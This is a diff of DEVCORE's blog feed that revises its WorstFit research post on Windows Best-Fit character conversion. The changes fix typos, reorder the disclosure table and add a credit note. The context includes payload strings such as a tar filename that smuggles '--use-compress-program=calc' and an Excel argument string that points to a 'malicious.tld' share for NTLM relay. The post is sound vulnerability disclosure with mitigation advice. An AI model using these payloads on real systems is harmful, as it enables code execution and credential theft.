@@ -4,7 +4,7 @@
  <title>DEVCORE 戴夫寇爾</title>
  <link href="https://devco.re/" rel="self"/>
  <link href="https://devco.re"/>
- <updated>2025-01-09T20:16:03+08:00</updated>
+ <updated>2025-01-15T23:57:11+08:00</updated>
  <id>https://devco.re</id>
  <author>
    <name></name>
@@ -198,7 +198,7 @@
 
 &lt;h3 id=&quot;the-dual-era-of-encoding&quot;&gt;The Dual Era of Encoding&lt;/h3&gt;
 
-&lt;p&gt;Even though Unicode became the backbone of Windows, Windows still need to do what they always do: backward compatible. They still need to support the old ANSI code pages. To achieve this, Windows implemented two different versions of APIs:&lt;/p&gt;
+&lt;p&gt;Even though Unicode became the backbone of Windows, Windows still needs to do what they always do: backward compatible. They still need to support the old ANSI code pages. To achieve this, Windows implemented two different versions of APIs:&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;&lt;strong&gt;ANSI APIs&lt;/strong&gt;: A Windows code page version with the letter “A” postfix used to indicate “ANSI”. For example, &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA&lt;/code&gt;&lt;/a&gt; function.&lt;/li&gt;
@@ -236,7 +236,7 @@
 
 &lt;p&gt;This bizarre transformation is what’s known as &lt;strong&gt;“Best-Fit”&lt;/strong&gt; behavior. As a result, the original string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;√π⁷≤∞&lt;/code&gt; transforms into a nonsensical &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;vp7=8&quot;&lt;/code&gt;. This behavior highlights the pitfalls of relying on ANSI APIs when handling non-ASCII characters.&lt;/p&gt;
 
-&lt;p&gt;And actually, it’s not just when using Windows APIs directly — this behaciour also occurs when using non-wide-character version CRT (C runtime) functions like &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getenv&lt;/code&gt;&lt;/a&gt;. Surprisingly, even when you receive arguments or environment variables through a seemingly straightforward non-wide-character &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; function like:&lt;/p&gt;
+&lt;p&gt;And actually, it’s not just when using Windows APIs directly — this behaviour also occurs when using non-wide-character version CRT (C runtime) functions like &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getenv&lt;/code&gt;&lt;/a&gt;. Surprisingly, even when you receive arguments or environment variables through a seemingly straightforward non-wide-character &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; function like:&lt;/p&gt;
 &lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
 #include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
 &lt;/span&gt;
@@ -263,13 +263,15 @@
 
 &lt;p&gt;For instance, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;∞&lt;/code&gt; (&lt;a href=&quot;https://www.compart.com/en/unicode/U+221E&quot;&gt;U+221E&lt;/a&gt;) symbol isn’t part of the &lt;a href=&quot;https://en.wikipedia.org/wiki/Windows-1252#Codepage_layout&quot;&gt;Windows-1252 code page&lt;/a&gt;, so Microsoft decided to map it to the “&lt;strong&gt;closest&lt;/strong&gt;” character—&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8&lt;/code&gt; (&lt;a href=&quot;https://worst.fit/mapping/#CP%3A1252%20FROM%3A0x221e&quot;&gt;🔍&lt;/a&gt;). Uh, okay. Yeah I guess they kinda look similar, but I thought they should be still completely different things…&lt;/p&gt;
 
-&lt;p&gt;Anyway, obviously there’s no strict formula for Best-Fit mapping – what Microsoft do is more about making characters look, or even “feel” somewhat alike.&lt;/p&gt;
+&lt;p&gt;Anyway, obviously there’s no strict formula for Best-Fit mapping – what Microsoft does is more about making characters look, or even “feel” somewhat alike.&lt;/p&gt;
 
 &lt;p&gt;Also, different language configurations (code pages) handle mappings differently. For instance, the yen sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+00A5&lt;/code&gt;) is mapped to a backslash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;) on the Japanese (932) code page, to a “Y” on the Central European (1250) code page, and remains unchanged on most other code pages. This variability will play a significant role in how exploits behave across different system settings.&lt;/p&gt;
 
 &lt;p&gt;If you’re curious about the specifics, you can check out our &lt;a href=&quot;https://worst.fit/mapping/&quot;&gt;Best-fit Mapping Grepper&lt;/a&gt; tool or dive into the raw mapping data on &lt;a href=&quot;https://www.unicode.org/Public/MAPPINGS/VENDORS/MICSFT/WindowsBestFit/readme.txt&quot;&gt;Unicode.org&lt;/a&gt; by yourself.&lt;/p&gt;
 
 &lt;p&gt;Interestingly, during our research we found that this &lt;strong&gt;Best-Fit&lt;/strong&gt; behavior was already mentioned back in Black Hat USA 2009 during Chris Weber’s presentation, &lt;a href=&quot;https://www.blackhat.com/presentations/bh-usa-09/WEBER/BHUSA09-Weber-UnicodeSecurityPreview-SLIDES.pdf&quot;&gt;“Unicode Security”&lt;/a&gt;. However, he only briefly touched on how this feature could be exploited to bypass simple blacklist.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;(&lt;strong&gt;Updated&lt;/strong&gt;: After this article was published, we learned that &lt;a href=&quot;https://x.com/hasegawayosuke&quot;&gt;Yosuke HASEGAWA&lt;/a&gt; also mentioned this behavior at &lt;a href=&quot;https://www.blackhat.com/presentations/bh-jp-08/bh-jp-08-Hasegawa/BlackHat-japan-08-Hasegawa-Char-Encoding.pdf&quot;&gt;Black Hat Japan 2008&lt;/a&gt;, covering part of our Filename Smuggling in Japanese code page.)&lt;/em&gt;&lt;/p&gt;
 
 &lt;p&gt;But this time, we’re taking big steps forward – showing how those sneaky Best-Fit conversions can operate on a &lt;strong&gt;system-wide level&lt;/strong&gt;, leading to even more impactful exploits, all unfolding right under your nose.&lt;/p&gt;
 
@@ -327,7 +329,7 @@
 &lt;strong&gt;Threat Characters&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;／&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+FF0F&quot;&gt;U+FF0F&lt;/a&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;＼&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+FF3C&quot;&gt;U+FF3C&lt;/a&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;¥&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+00A5&quot;&gt;U+00A5&lt;/a&gt; (JP), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;₩&lt;/code&gt; &lt;a href=&quot;https://www.compart.com/en/unicode/U+20A9&quot;&gt;U+20A9&lt;/a&gt; (KR)&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;p&gt;Let’s start with a simple case. In Chrome V8, the underlying implementation of its Developer Shell (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;d8.exe&lt;/code&gt;) uses the ANSI API &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCurrentDirectoryA()&lt;/code&gt; to obtain the current working directory. This means that if we can have a working direcotry with malicious Unicode characters, these characters will automatically be converted into path traversal payloads when accessed via the ANSI API. As a result, it leads to an unintended file access.&lt;/p&gt;
+&lt;p&gt;Let’s start with a simple case. In Chrome V8, the underlying implementation of its Developer Shell (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;d8.exe&lt;/code&gt;) uses the ANSI API &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCurrentDirectoryA()&lt;/code&gt; to obtain the current working directory. This means that if we can have a working directory with malicious Unicode characters, these characters will automatically be converted into path traversal payloads when accessed via the ANSI API. As a result, it leads to an unintended file access.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/4.png&quot; alt=&quot;&quot; /&gt;
 &lt;em&gt;↑ Unintended file access on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:/windows/win.ini&lt;/code&gt;:&lt;/em&gt;&lt;/p&gt;
@@ -337,7 +339,7 @@
 &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/5.png&quot; alt=&quot;&quot; /&gt;
 &lt;em&gt;↑ Pollute the return value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dir.getwd()&lt;/code&gt;:&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;Of course, the above cases are still bugs instead of real vulneraiblities. Let’s take a look at some real-world cases!&lt;/p&gt;
+&lt;p&gt;Of course, the above cases are still bugs instead of real vulnerabilities. Let’s take a look at some real-world cases!&lt;/p&gt;
 
 &lt;h4 id=&quot;-case-study---path-traversal-to-rce-on-cuckoo-sandbox&quot;&gt;➤ Case Study - Path Traversal to RCE on Cuckoo Sandbox&lt;/h4&gt;
 
@@ -368,9 +370,9 @@
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;The attacker can then download &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cuckoo.conf&lt;/code&gt;, and gathered serveral sensitive information to calculate the Flask PIN code, ultimately achieving RCE on the Sandbox Host!&lt;/p&gt;
+&lt;p&gt;The attacker can then download &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cuckoo.conf&lt;/code&gt;, and gathered several sensitive information to calculate the Flask PIN code, ultimately achieving RCE on the Sandbox Host!&lt;/p&gt;
 
-&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/EeMcDT95WSM?si=NJ8xmmWNEICeq-d7&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+&lt;iframe width=&quot;100%&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/EeMcDT95WSM?si=NJ8xmmWNEICeq-d7&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
 
 &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
@@ -420,7 +422,7 @@ It could pop &lt;strong&gt;calc.exe&lt;/strong&gt; on the system!&lt;/p&gt;
 
 &lt;p&gt;But still, why can these double quotes alter the arguments?&lt;/p&gt;
 
-&lt;p&gt;Firstly, on Windows, the &lt;strong&gt;entire command line&lt;/strong&gt; is passed as a single string to the spawned process, leaving it up to the executable to parse. That’s why the &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw&quot;&gt;CreateProcess API&lt;/a&gt; accepts the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lpCommandLine&lt;/code&gt; patameter directly. This differs from UNIX-like systems, where arguments are always passed as an array of strings. For a more detailed explanation of argument parsing on Windows, check out &lt;a href=&quot;https://daviddeley.com/autohotkey/parameters/parameters.htm#WIN&quot;&gt;this article&lt;/a&gt; by David Deley.&lt;/p&gt;
+&lt;p&gt;Firstly, on Windows, the &lt;strong&gt;entire command line&lt;/strong&gt; is passed as a single string to the spawned process, leaving it up to the executable to parse. That’s why the &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw&quot;&gt;CreateProcess API&lt;/a&gt; accepts the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lpCommandLine&lt;/code&gt; parameter directly. This differs from UNIX-like systems, where arguments are always passed as an array of strings. For a more detailed explanation of argument parsing on Windows, check out &lt;a href=&quot;https://daviddeley.com/autohotkey/parameters/parameters.htm#WIN&quot;&gt;this article&lt;/a&gt; by David Deley.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
@@ -515,7 +517,7 @@ It could pop &lt;strong&gt;calc.exe&lt;/strong&gt; on the system!&lt;/p&gt;
 
 &lt;p&gt;To exploit this, we can simply name the tar file as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa＂ ＂--use-compress-program=calc＂ ＂bbb.tar&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;＂&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+FF02&lt;/code&gt;). This injects the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--use-compress-program&lt;/code&gt; parameter, which allows arbitrary command execution. In our demonstration, this results in popping up &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;calc.exe&lt;/code&gt;.&lt;/p&gt;
 
-&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/DPIp42-Ls0U?si=dczou7dD-p4CSOQ9&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+&lt;iframe width=&quot;100%&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/DPIp42-Ls0U?si=dczou7dD-p4CSOQ9&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;In this demonstration, we use an English-configured Windows server (Code Page 1252) as an example. This technique should also work on other 125x code pages and Code Page 874 configurations.&lt;/p&gt;
@@ -527,11 +529,11 @@ It could pop &lt;strong&gt;calc.exe&lt;/strong&gt; on the system!&lt;/p&gt;
 
 &lt;p&gt;The first one involves a modified version of plink.exe used in &lt;strong&gt;TortoiseGit&lt;/strong&gt;. When a user enters a malicious URI for cloning, it can trigger code execution. For details, check out our &lt;a href=&quot;https://worst.fit/worstfit/Arg-Splitting/plink/&quot;&gt;curated list&lt;/a&gt;.&lt;/p&gt;
 
-&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/EF1U-C0e_9E?si=oEKebidfQ1hRIead&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+&lt;iframe width=&quot;100%&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/EF1U-C0e_9E?si=oEKebidfQ1hRIead&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
 
 &lt;p&gt;The second example involves &lt;strong&gt;RStudio&lt;/strong&gt;, which supports version control with SVN. If an SVN project is placed in a maliciously crafted folder, a single click can trigger a calculator to pop up on the user’s machine! For more details, check out our &lt;a href=&quot;https://worst.fit/worstfit/Arg-Splitting/SVN/&quot;&gt;curated list&lt;/a&gt;.&lt;/p&gt;
 
-&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/YKw4ZcQ75Hc?si=Gd6pZ7r4wLToX15m&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+&lt;iframe width=&quot;100%&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/YKw4ZcQ75Hc?si=Gd6pZ7r4wLToX15m&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
 
 &lt;h4 id=&quot;-case-study-3---microsoft-excel-remote-code-execution-cve-2024-49026&quot;&gt;➤ Case Study 3 - Microsoft Excel Remote Code Execution &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49026&quot;&gt;CVE-2024-49026&lt;/a&gt;&lt;/h4&gt;
 
@@ -547,9 +549,9 @@ It could pop &lt;strong&gt;calc.exe&lt;/strong&gt; on the system!&lt;/p&gt;
   &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;．．／．．／．．／Windows／win.ini＂ ／n ＂＼＼malicious.tld@80＼pwn.xlsx&lt;/code&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;p&gt;By combining two tricks, we can trigger an Argument Injection on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Excel.exe&lt;/code&gt; with just 1-Clik. Since Excel itself &lt;a href=&quot;https://support.microsoft.com/en-us/office/command-line-switches-for-microsoft-office-products-079164cd-4ef5-4178-b235-441737deb3a6#Category=Excel&quot;&gt;doesn’t have any good argument&lt;/a&gt; for further exploitation, we only use NTLM Relay along with RBCD/ADCS to achieve RCE!&lt;/p&gt;
+&lt;p&gt;By combining two tricks, we can trigger an Argument Injection on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Excel.exe&lt;/code&gt; with just 1-Click. Since Excel itself &lt;a href=&quot;https://support.microsoft.com/en-us/office/command-line-switches-for-microsoft-office-products-079164cd-4ef5-4178-b235-441737deb3a6#Category=Excel&quot;&gt;doesn’t have any good argument&lt;/a&gt; for further exploitation, we only use NTLM Relay along with RBCD/ADCS to achieve RCE!&lt;/p&gt;
 
-&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/zklkmbDyR1U?si=dLfxuwaO5U2En20n&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+&lt;iframe width=&quot;100%&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/zklkmbDyR1U?si=dLfxuwaO5U2En20n&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
 
 &lt;p&gt;&lt;em&gt;P.S. if you find a better argument that can directly lead to RCE, please let us know!&lt;/em&gt; 🙂&lt;/p&gt;
 
@@ -637,7 +639,7 @@ It could pop &lt;strong&gt;calc.exe&lt;/strong&gt; on the system!&lt;/p&gt;
 
 &lt;h4 id=&quot;-who-is-responsible-for-that&quot;&gt;🧐 &lt;strong&gt;Who is responsible for that?&lt;/strong&gt;&lt;/h4&gt;
 
-&lt;p&gt;Even if we both agree that this is an issue, the next much challenging question is: “Who is responsible for it?” Since the problematic code are embedded automatically during compilation (the compiler attaches the entry &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mainCRTStartup()&lt;/code&gt;, which calls the ANSI API within MSVCRT/UCRT), the responsibility becomes unclear. Is it because &lt;strong&gt;“the developer failed to use the correct &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wmain()&lt;/code&gt;”&lt;/strong&gt;, or is it &lt;strong&gt;“CRT’s failure for not splitting the command line well and pass the wrong argument to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main()&lt;/code&gt;”&lt;/strong&gt;?&lt;/p&gt;
+&lt;p&gt;Even if we both agree that this is an issue, the next much challenging question is: “Who is responsible for it?” Since the problematic code is embedded automatically during compilation (the compiler attaches the entry &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mainCRTStartup()&lt;/code&gt;, which calls the ANSI API within MSVCRT/UCRT), the responsibility becomes unclear. Is it because &lt;strong&gt;“the developer failed to use the correct &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wmain()&lt;/code&gt;”&lt;/strong&gt;, or is it &lt;strong&gt;“CRT’s failure for not splitting the command line well and pass the wrong argument to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main()&lt;/code&gt;”&lt;/strong&gt;?&lt;/p&gt;
 
 &lt;p&gt;To make things even more confusing, some projects only provide source code, leaving the prebuilt executable files distributed to be handled by third-party volunteers across the Internet. In such cases, who should be held accountable for the issue? Taking it a step further, could this even be considered a case of &lt;a href=&quot;https://en.wikipedia.org/wiki/Backdoor_(computing)#Compiler_backdoors&quot;&gt;compiler-introduced security vulnerabilities&lt;/a&gt;? 😉&lt;/p&gt;
 
@@ -723,6 +725,11 @@ It could pop &lt;strong&gt;calc.exe&lt;/strong&gt; on the system!&lt;/p&gt;
       &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://hackerone.com/reports/2550951&quot;&gt;Won’t Fix&lt;/a&gt;&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
+      &lt;td&gt;2024/06/13&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Apache Subversion - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svn.exe&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/cve-2024-45720&quot;&gt;CVE-2024-45720&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
       &lt;td&gt;2024/06/16&lt;/td&gt;
       &lt;td style=&quot;text-align: left&quot;&gt;Microsoft Tar - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe&lt;/code&gt;&lt;/td&gt;
       &lt;td style=&quot;text-align: left&quot;&gt;Won’t Fix&lt;/td&gt;
@@ -738,14 +745,19 @@ It could pop &lt;strong&gt;calc.exe&lt;/strong&gt; on the system!&lt;/p&gt;
       &lt;td style=&quot;text-align: left&quot;&gt;Won’t Fix&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
-      &lt;td&gt;2024/08/19&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;GNU Wget&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;No Reply&lt;/td&gt;
+      &lt;td&gt;2024/06/19&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Oracle Java - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;java.exe&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Pending Fix&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
-      &lt;td&gt;2024/06/13&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Apache Subversion - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svn.exe&lt;/code&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;CVE-2024-45720&lt;/td&gt;
+      &lt;td&gt;2024/06/19&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Perl - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perl.exe&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Won’t Fix&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2024/07/15&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Perforce - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p4.exe&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2024-8067&quot;&gt;CVE-2024-8067&lt;/a&gt;&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
       &lt;td&gt;2024/08/05&lt;/td&gt;
@@ -758,21 +770,6 @@ It could pop &lt;strong&gt;calc.exe&lt;/strong&gt; on the system!&lt;/p&gt;
       &lt;td style=&quot;text-align: left&quot;&gt;Fixed&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
-      &lt;td&gt;2024/07/15&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Perforce - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p4.exe&lt;/code&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;CVE-2024-8067&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;2024/06/19&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Oracle Java - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;java.exe&lt;/code&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Pending Fix&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;2024/06/19&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Perl - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perl.exe&lt;/code&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Won’t Fix&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
       &lt;td&gt;2024/08/19&lt;/td&gt;
       &lt;td style=&quot;text-align: left&quot;&gt;OpenSSL - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openssl.exe&lt;/code&gt;&lt;/td&gt;
       &lt;td style=&quot;text-align: left&quot;&gt;Other&lt;/td&gt;
@@ -781,6 +778,11 @@ It could pop &lt;strong&gt;calc.exe&lt;/strong&gt; on the system!&lt;/p&gt;
       &lt;td&gt;2024/08/19&lt;/td&gt;
       &lt;td style=&quot;text-align: left&quot;&gt;wkhtmltopdf - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wkhtmltopdf.exe&lt;/code&gt;&lt;/td&gt;
       &lt;td style=&quot;text-align: left&quot;&gt;EOL&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2024/08/19&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;GNU Wget&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;No Reply&lt;/td&gt;
     &lt;/tr&gt;
   &lt;/tbody&gt;
 &lt;/table&gt;
@@ -805,7 +807,7 @@ It could pop &lt;strong&gt;calc.exe&lt;/strong&gt; on the system!&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;As a developer&lt;/strong&gt;, please use the Wide Character API as much as possible. As well as the C Runtime Library, they also provide the wide character versions, such as &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd-wgetcwd?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_wgetcwd&lt;/code&gt;&lt;/a&gt; and &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_wgetenv&lt;/code&gt;&lt;/a&gt;. Otherwise, the implementation of the underlying implementation still call the ANSI API, which is vulnerable to our WorstFit attacks, too!&lt;/p&gt;
